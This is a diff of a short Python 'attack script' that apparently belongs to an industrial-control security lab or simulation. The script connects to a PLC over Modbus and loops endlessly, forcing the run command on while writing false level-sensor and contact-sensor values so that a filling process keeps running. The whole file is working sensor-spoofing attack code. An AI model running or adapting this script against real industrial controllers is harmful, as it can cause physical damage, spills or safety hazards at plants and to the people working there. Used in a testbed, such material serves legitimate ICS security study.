@@ -1,26 +1,39 @@
 #!/usr/bin/env python
 
-from pymodbus.client.sync import ModbusTcpClient as ModbusClient
-from pymodbus.exceptions import ConnectionException
+#########################################
+# Imports
+#########################################
+# - Logging
 import logging
 
+# - Attack script
+import  sys
+
+# - Attack communication
+from modbus	import ClientModbus as Client
+from modbus	import ConnectionException 
+
+# - World environement
+from world	import *
+
+#########################################
+# Logging
+#########################################
 logging.basicConfig()
 log = logging.getLogger()
 log.setLevel(logging.INFO)
 
 #####################################
-# Code
+# Move and fill code
 #####################################
-client = ModbusClient('localhost', port=5020)
+client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
 
 try:
     client.connect()
     while True:
-        rq = client.write_register(0x10, 1) # Run Plant, Run!
-        rq = client.write_register(0x1, 0) # Level Sensor
-        rq = client.write_register(0x2, 0) # Limit Switch
-        rq = client.write_register(0x3, 1) # Motor
-        rq = client.write_register(0x4, 1) # Nozzle
+        rq = client.write(PLC_TAG_RUN, 1) 	# Run Plant, Run!
+        rq = client.write(PLC_TAG_LEVEL, 0) 	# Level Sensor
+        rq = client.write(PLC_TAG_CONTACT, 0) 	# Contact Sensor
 except KeyboardInterrupt:
     client.close()
 except ConnectionException:
